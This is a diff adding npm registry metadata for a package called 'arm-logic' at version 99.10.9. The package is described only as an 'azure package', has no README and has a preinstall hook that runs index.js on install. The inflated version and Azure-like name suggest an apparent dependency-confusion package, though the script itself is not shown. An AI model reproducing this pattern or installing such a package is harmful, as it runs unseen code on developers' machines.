@@ -1,0 +1,62 @@
+{
+    "_id": "arm-logic",
+    "name": "arm-logic",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-logic",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-logic@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-zvf6v/l+Nmx2/AMtMLTzGUNTpTiPtJGOFexQPF383jLBanuoB6Y9ocB5pGzeYawkff9cnrrLIM3dJE61f2bsPQ==",
+                "shasum": "48ed1f65de3c6f5814487657925cce39fd982955",
+                "tarball": "https://registry.npmjs.org/arm-logic/-/arm-logic-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5061,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNzUJACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoHTg/9G0ywFczU3R9C8pA9w4Bv6kQSskSYJRHGmQ8LlF4vxXWNdebZ\r\nI8ukyaUJsrbfrRFjFIFtkUvNYbvLuIENhy0K3JgFhmDngnXkjngkk26wDpTH\r\nwdMmkd7WfPI3EV8YdTJvtyGZjXeIIBfiRjZQ3USco7uKceFZRJ0K1ahBEgoG\r\n4GZMZwtQstOtIe8iSBdv9rvBBwybZO70T52WmXU67gzVq5lKoKqA77kf3Ns/\r\nj6v7c9n3BKFWQanRg5kGBtfBCRjQWYS8J/7pO41tWukrsfHc2Qrx8A+6XlFC\r\nsHG/yg3MN2eykVIv+kl9mlhWfOPbaoo103AI8Os+MzWeiPjzdi6S5a7amQC3\r\nB2bEz6WrJ/DE/g/wtcUmR/WKk9pjU4YwhdApNrTX0mwZK4ImcZm2qzp/DzC5\r\nRFOvXoehbpwroSrgzGWWfxUrmT7I6PkejzOY1B9zf58ap3agZ7B173caZ6gq\r\n5F2KCvNHgh3Wb572h0LKLPPoj5Ppg4nQD5d+1X+eaFyWvckyjIvgfM/3c2mI\r\nHdNSSjnWFbk7kl76z1F7woX74jR3V7hT2ZYE38V5Z9VWhLm0Ue8i0CTwX7iD\r\naMQ44w9VCfj3F3DfJFtQkLqUXCnEpZbSs2roLwCkjjVWRaUmvjJaUj0vd3sI\r\nXzsHUbKRL8xtEWl7sGjtC/uK69CAXcf+76E=\r\n=w/r6\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "jbdxittb",
+                "email": "jbdxittb@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "jbdxittb",
+                    "email": "jbdxittb@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-logic_99.10.9_1647785225591_0.9701134729369931"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T14:07:05.590Z",
+        "99.10.9": "2022-03-20T14:07:05.723Z",
+        "modified": "2022-03-20T14:07:05.825Z"
+    },
+    "maintainers": [
+        {
+            "name": "jbdxittb",
+            "email": "jbdxittb@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
